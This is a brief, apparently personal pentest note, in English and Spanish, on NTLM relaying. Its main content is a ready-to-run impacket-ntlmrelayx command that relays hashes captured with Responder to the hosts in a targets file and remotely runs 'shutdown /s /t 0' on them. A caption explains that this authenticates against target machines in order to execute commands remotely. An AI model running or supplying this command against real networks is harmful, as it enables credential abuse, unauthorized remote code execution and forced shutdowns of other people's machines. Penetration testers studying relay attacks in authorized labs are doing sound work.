# ntlm relaying  simple

```python
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c 'shutdown /s /t 0 '
```

 este redirige los hashes  capturados con el responder,  trata de autenticarse contra una maquina  o objetivos con el fin de ejecutar comandos de manera remota

